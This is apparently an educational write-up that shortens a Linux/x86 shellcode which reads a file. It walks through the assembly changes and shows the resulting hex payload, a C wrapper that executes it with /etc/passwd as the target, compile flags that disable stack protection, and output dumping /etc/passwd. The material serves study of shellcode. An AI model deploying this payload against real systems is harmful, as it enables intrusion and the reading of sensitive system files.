# File Reader

<p style="text-align: justify;">Address of the original shellcode:</p>
- [http://shell-storm.org/shellcode/files/shellcode-73.php](http://shell-storm.org/shellcode/files/shellcode-73.php)

Original source code:
```nasm
/*
Linux/x86 file reader.

65 bytes + pathname
Author: certaindeath

Source code:
_start:
	xor	%eax, %eax
	xor	%ebx, %ebx
	xor	%ecx, %ecx
	xor	%edx, %edx
	jmp	two

one:
	pop	%ebx
	
	movb	$5, %al
	xor	%ecx, %ecx
	int	$0x80
	
	mov	%eax, %esi
	jmp	read

exit:
	movb	$1, %al
	xor	%ebx, %ebx
	int	$0x80

read:
	mov	%esi, %ebx
	movb	$3, %al
	sub	$1, %esp
	lea	(%esp), %ecx
	movb	$1, %dl
	int	$0x80

	xor	%ebx, %ebx
	cmp	%eax, %ebx
	je	exit

	movb	$4, %al
	movb	$1, %bl
	movb	$1, %dl
	int	$0x80
	
	add	$1, %esp
	jmp	read

two:
	call	one
	.string	"file_name"
*/
char main[]=
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
"\xff"
"/etc/passwd"; //Put here the file path, default is /etc/passwd
```
<p style="text-align: justify;">I will try to present my polymorphic shellcode in parts (and finally the whole) in order to explain in detail the changes and improvements I have made.</p>

### Clearing 

Original code:
```nasm
global _start			

section .text
_start:
  xor eax, eax
  xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	jmp two
```
Code after changes:
```nasm
global _start			

section .text
_start:
	xor eax, eax
	jmp two
```
<p style="text-align: justify;">The EBX, ECX and EDX registers are empty when you enter the _start() function, so there is no need to clean them.
</p>

### sys_open()
 
<p style="text-align: justify;">The "two" section remains unchanged and remains at the end of our code.</p>

```nasm
 two:
  call one
```
Original code:
```nasm
 one:
	pop ebx
	mov al, 5
	xor ecx, ecx
	int 0x80
	mov esi, eax
	jmp read
```
Code after changes:
```nasm
 one:
	pop ebx
	mov al, 5
	int 0x80
	mov esi, eax
```
<p style="text-align: justify;">When this part of the code is called, the ECX index is empty, so there is no need to clean it again. Due to the change in the order of the sections in the code - I moved the "exit" section directly after the "read" section - the "jmp read" instruction is no longer needed, as the "read" section code lines immediately follow the "one" section.
</p>
 
### sys_read()
 
Original code:
```nasm
 read:
	mov ebx, esi
	mov al, 3
	sub esp, 1
	lea ecx, [esp]
	mov dl, 1
	int 0x80
```
Code after changes:
```nasm
 read:
	mov ebx, esi
	mov al, 3
	mov ecx, esp
	mov dl, 1
	int 0x80
```
<p style="text-align: justify;">I replaced two instructions - changing the ESP value, i.e. top of the stack (sub esp, 1) and pointing his pointer to ECX index (lea ecx, [esp]), to one instruction placing the top of the stack directly in the ECX register (mov ecx, esp ).
</p>

### sys_write()

Original code:
```nasm
	xor ebx, ebx
	cmp ebx, eax
	je exit
	mov al, 4
	mov byte bl, 1
	mov byte  dl, 1
	int 0x80
	add esp, 1
	jmp read
```
Code after changes:
```nasm
  or al, al
	jz exit
	mov al, 4
	mov bl, dl
	int 0x80
	jmp read
```
<p style="text-align: justify;">This section has been completely rebuilt. At the beginning, instead of resetting the EBX register and then comparing it to EAX, and if the values are the same (both registers are zero), execute JMP to the "exit" section, EAX using the logical operator OR is compared to zero and if ZF flag is set, JMP to the "exit" section is executed. Then, due to the fact that the EDX register is already 1, instead of two separate instructions, one "mov ebx, edx" is enough to get the same effect. Finally, since we did not use the "sub esp, 1" statement in the sys_read() section, the "add esp, 1" statement is also unnecessary.</p>

### sys_exit()

Original code:
```nasm
exit:
	inc eax
	mov byte al, 1
	xor ebx, ebx
	int 0x80
```
Code after changes:
```nasm
exit:
	inc eax
	int 0x80
```
<p style="text-align: justify;">After the sys_write () system call, the EAX register contains zero, the MOV instruction is replaced by a simple "inc eax". In addition, cleaning the EBX registry is also unnecessary.</p>

### Full code after changes

```nasm
global _start			

section .text
_start:
	xor eax, eax
	jmp two

one:
	pop ebx
	mov al, 5
	int 0x80
	mov esi, eax

read:
	mov ebx, esi
	mov al, 3
	mov ecx, esp
	mov dl, 1
	int 0x80
	or al, al
	jz exit
	mov al, 4
	mov bl, dl
	int 0x80
		
	jmp read

exit:
	inc eax
	int 0x80
	
two:
	call one
```

### Compiling and Execution

```sh
$ ./compile.sh file-reader
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
"\x31\xc0\xeb\x20\x5b\xb0\x05\xcd\x80\x89\xc6\x89\xf3\xb0\x03\x89\xe1\xb2\x01\xcd\x80\x08\xc0\x74\x08\xb0\x04\x88\xd3\xcd\x80\xeb\xea\x40\xcd\x80\xe8\xdb\xff\xff\xff"
```
<p style="text-align: justify;">Shellcode.c wrapper file content (note the file name after shellcode):</p>

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xeb\x20\x5b\xb0\x05\xcd\x80\x89\xc6\x89\xf3\xb0\x03\x89\xe1\xb2\x01\xcd\x80\x08\xc0\x74\x08\xb0\x04\x88\xd3\xcd\x80\xeb\xea\x40\xcd\x80\xe8\xdb\xff\xff\xff"
"/etc/passwd";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
Execution:
```sh
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode

Shellcode Length:  52
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
[..]
```

### Summary

Original shellcode length:
- <b>65 bytes</b>
Length of polymorphic shellcode:
- **41 bytes**
Difference in length:
- **~37%**
